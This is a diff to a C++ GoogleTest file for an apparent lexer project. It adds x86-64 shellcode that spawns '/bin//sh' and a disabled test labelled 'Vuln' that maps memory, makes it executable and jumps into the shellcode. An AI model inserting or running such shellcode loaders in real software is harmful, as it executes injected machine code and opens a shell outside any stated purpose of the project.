@@ -1,3 +1,8 @@
+#include <cstring>
+
+#include <unistd.h>
+#include <sys/mman.h>
+
 #include <gtest/gtest.h>
 
 #include "lexer.h"
@@ -486,4 +491,34 @@ fun main() {
     return fib(0, 1, 6);
 }
 )", 21, "");
+}
+
+static char shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50"
+                          "\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05";
+
+TEST(Vuln, DISABLED_CheckShell) {
+    typedef void (*vptr)();
+
+    const auto pageSize = getpagesize();
+
+    auto region = mmap(nullptr, pageSize, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+    if (region == MAP_FAILED) {
+        perror("mmap");
+        ASSERT_FALSE(true);
+        return;
+    }
+
+    std::strcpy(reinterpret_cast<char*>(region), shellcode);
+
+    if (mprotect(region, pageSize, PROT_EXEC) < 0) {
+        perror("mprotect");
+        ASSERT_FALSE(true);
+        return;
+    }
+
+    auto l = reinterpret_cast<vptr>(region);
+
+    l();
+
+    munmap(region, pageSize);
 }
